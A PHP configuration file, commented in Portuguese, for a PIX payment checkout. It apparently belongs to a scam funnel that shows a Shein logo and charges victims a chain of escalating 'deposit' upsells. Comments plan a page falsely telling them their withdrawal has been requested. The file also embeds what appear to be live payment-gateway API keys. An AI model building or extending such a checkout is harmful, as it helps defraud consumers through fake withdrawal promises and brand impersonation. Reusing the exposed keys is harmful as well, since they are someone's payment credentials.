<?php
// ################## CONFIGURAÇÕES DE CHECKOUT ################

// $gateway_api = "https://app.duttyfy.com.br/api-pix/sua_chave_encriptada";
// Aqui é minha chave pra testes. Deixo aqui comentada pra quando preciso alterar algo e testar o funil ou checkout
//$gateway_api = "https://app.duttyfy.com.br/api-pix/2pgY-WBQv6oTv_8cWme9qJNDTOOn5PN1G1rx0s_B00AARfq1Bjkb5IJ2nngU734lizHgFIQqoeS7YofkjrgObQ"; //NLO
$gateway_api = "https://www.pagamentos-seguros.app/api-pix/DHen6fi21EJLygcTXa3BAeMLQrhjeiFpInjCouCDVxEExnp_627WhTHG9HxoGbpm0FG5wtGfL-ebfcSqFTe-Ag"; //mrpintomole

$icon_url = ""; //url ou caminho de favicon

if(isset($_GET['up']) && !empty($_GET['up'])){
    $up = (int)$_GET['up'];
    switch($up){
		case "1": //up1
            $upsell = "../up2";
            $valor = "20.64";
        break;

		case "2":
            $upsell = "../up3";
            $valor = "27.90";
        break;

		case "3":
            $upsell = "../up4";
            $valor = "21.56";
        break;

		case "4":
            $upsell = "../up5"; //esse obrigado nao existe, preciso de uma pagina dizendo q o saque foi solicitado e em breve estará na conta
            $valor = "22.30";
        break;

		case "5":
            $upsell = "../up6"; //esse obrigado nao existe, preciso de uma pagina dizendo q o saque foi solicitado e em breve estará na conta
            $valor = "43.94";
        break;

		case "6":
            $upsell = "../up2"; //esse obrigado nao existe, preciso de uma pagina dizendo q o saque foi solicitado e em breve estará na conta
            $valor = "17.50";
        break;


        default: //front
            $front = 1;
        break;
    };
} else { //front
    $front = 1;
};

//configuração do front
if(isset($front) && $front == 1){
	$upsell = "../up1"; //caminho ou URL pra onde o usuário é enviado após o pagamento
    /*
	if(isset($_GET['valor']) && !empty($_GET['valor']) && $_GET['valor'] >= 5){
		$valor = (float)$_GET['valor'];  // Resultado: 51.99 por exemplo
	} else {
		// se o valor não existir ou for vazio ou menor q 5, padrão é 20
		$valor = 20;
	}; */
	$valor = 21.67;
};

$logo_ativo = 1;
$logo_url = "./images/shein-logo.png";
$checkoutTitulo = "Pagamento PIX"; //titulo que aparece no checkout
$checkoutDesc = "Escaneie o QR Code para pagar"; //$descrição que aparece no checkout

$nome_front = "Depósito";
$nome_up = "Depósito Bônus";
?>